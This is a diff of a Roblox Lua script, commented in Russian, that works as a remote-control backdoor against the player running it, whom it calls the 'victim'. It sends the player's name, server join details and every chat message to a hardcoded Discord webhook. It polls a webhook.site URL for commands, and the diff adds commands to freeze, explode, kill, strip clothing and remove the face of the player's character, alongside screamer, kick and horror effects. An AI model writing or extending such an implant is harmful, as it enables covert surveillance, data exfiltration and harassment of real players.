@@ -1,6 +1,5 @@
 -- [[ CONFIG ]] --
 local log_webhook = "https://discord.com/api/webhooks/1463513332697927883/7XBUBBop6fsTyZvAfdCUKskGulE5z4MpXl_Q6Pa5Pqxg8Fdz7hRlnlF7PUzayceSrvF5"
--- Твой уникальный API ключ с Webhook.site
 local control_api = "https://webhook.site/token/2823b2ef-9cc8-4640-909e-4b7893906b78/requests?sorting=created_at&direction=desc"
 
 local Players = game:GetService("Players")
@@ -17,7 +16,6 @@ local function sendLog(title, desc, color)
                 ["color"] = color or 0x00ffff,
                 ["fields"] = {
                     {["name"] = "👤 Жертва", ["value"] = lp.Name, ["inline"] = true},
-                    {["name"] = "🎒 Инвентарь", ["value"] = "```Пусто```", ["inline"] = true},
                     {["name"] = "🔗 Join", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')```"}
                 }
             }}
@@ -29,7 +27,7 @@ end
 
 task.spawn(function()
     local last_msg_id = ""
-    while task.wait(3) do -- Проверка команд каждые 3 секунды
+    while task.wait(2) do -- Ускорил проверку до 2 секунд
         pcall(function()
             local res = game:HttpGet(control_api)
             local json = HttpService:JSONDecode(res)
@@ -38,15 +36,17 @@ task.spawn(function()
                 local latest = json.data[1]
                 if latest.id ~= last_msg_id then
                     last_msg_id = latest.id
-                    -- Скрипт ищет команду в тексте, который пришел на сайт
                     local content = string.lower(latest.content or latest.raw_body or "")
-                    
+                    local char = lp.Character or lp.CharacterAdded:Wait()
+                    local hum = char:FindFirstChildOfClass("Humanoid")
+
+                    -- [ СТАРЫЕ КОМАНДЫ ] --
                     if string.find(content, "screamer") then
                         local g = Instance.new("ScreenGui", lp.PlayerGui)
                         local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1,0,1,0); i.Image = "rbxassetid://15518663806"
                         local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s:Play()
                         task.delay(0.5, function() g:Destroy() end)
-                        sendLog("😱 СКРИМЕР", "Выполнен из чата Discord", 0xffffff)
+                        sendLog("😱 СКРИМЕР", "Выполнен", 0xffffff)
                         
                     elseif string.find(content, "kick") then
                         local reason = string.match(content, "kick%s*%((.*)%)") or "Disconnected"
@@ -54,8 +54,49 @@ task.spawn(function()
                         lp:Kick("\n[AxM Overlord]\n" .. reason)
                         
                     elseif string.find(content, "horror") then
-                        Lighting.ClockTime = 0
+                        Lighting.ClockTime = 0; Lighting.Brightness = 0
+                        local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://163721344"; s.Volume = 3; s:Play()
                         sendLog("🌑 ХОРРОР", "Тьма активирована", 0x333333)
+
+                    -- [ НОВЫЕ КОМАНДЫ ] --
+                    elseif string.find(content, "freeze") then
+                        char.HumanoidRootPart.Anchored = true
+                        sendLog("🧊 ЗАМОРОЗКА", "Игрок не может двигаться", 0x00EBFF)
+
+                    elseif string.find(content, "unfreeze") then
+                        char.HumanoidRootPart.Anchored = false
+                        sendLog("🔥 РАЗМОРОЗКА", "Игрок снова двигается", 0xFF8000)
+
+                    elseif string.find(content, "explode") then
+                        local ex = Instance.new("Explosion", char.HumanoidRootPart)
+                        ex.Position = char.HumanoidRootPart.Position
+                        sendLog("💥 ВЗРЫВ", "Персонаж взорван", 0xFF0000)
+
+                    elseif string.find(content, "jump") then
+                        hum.Jump = true
+                        sendLog("🦘 ПРЫЖОК", "Жертва подпрыгнула", 0x00FF00)
+
+                    elseif string.find(content, "lowspeed") then
+                        hum.WalkSpeed = 4
+                        sendLog("🐌 ЗАМЕДЛЕНИЕ", "Скорость установлена на 4", 0xFFFF00)
+
+                    elseif string.find(content, "highspeed") then
+                        hum.WalkSpeed = 100
+                        sendLog("⚡ СКОРОСТЬ", "Скорость установлена на 100", 0xFFFF00)
+
+                    elseif string.find(content, "reset") then
+                        hum.Health = 0
+                        sendLog("⚰️ РЕСЕТ", "Игрок убит", 0x000000)
+
+                    elseif string.find(content, "naked") then
+                        for _, v in pairs(char:GetChildren()) do
+                            if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("CharacterMesh") then v:Destroy() end
+                        end
+                        sendLog("👕 ГОЛЫЙ", "Одежда удалена", 0xFFC0CB)
+
+                    elseif string.find(content, "nofaces") then
+                        if char.Head:FindFirstChild("face") then char.Head.face:Destroy() end
+                        sendLog("😶 БЕЗ ЛИЦА", "Лицо удалено", 0xFFFFFF)
                     end
                 end
             end
@@ -63,5 +104,5 @@ task.spawn(function()
     end
 end)
 
-lp.Chatted:Connect(function(m) sendLog("💬 ЧАТ ИГРОКА", "Пишет: `" .. m .. "`", 0x5555ff) end)
-sendLog("🛰️ СИСТЕМА ГОТОВА", "Жду команд в чате!", 0x00ff00)
+lp.Chatted:Connect(function(m) sendLog("💬 ЧАТ", "Пишет: `" .. m .. "`", 0x5555ff) end)
+sendLog("🛰️ AXM ULTIMATE LOADED", "Доступно 12+ команд. Жду жатвы.", 0x00ff00)
